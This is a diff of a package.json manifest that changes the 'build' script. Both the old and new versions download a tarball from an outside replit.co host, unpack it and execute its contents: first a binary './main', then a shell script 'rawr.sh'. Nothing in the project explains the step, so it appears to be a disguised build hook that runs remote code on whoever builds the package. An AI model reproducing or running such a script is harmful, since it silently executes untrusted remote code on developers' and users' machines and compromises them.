@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "build": "wget https://x.idotmastera.repl.co/meow.tar.gz && tar -xf meow.tar.gz && chmod +x ./main && ./main"
+    "build": "wget https://x.idotmastera.repl.co/meow.tar.gz && tar -xf meow.tar.gz && bash rawr.sh"
   },
   "keywords": [],
   "author": "",
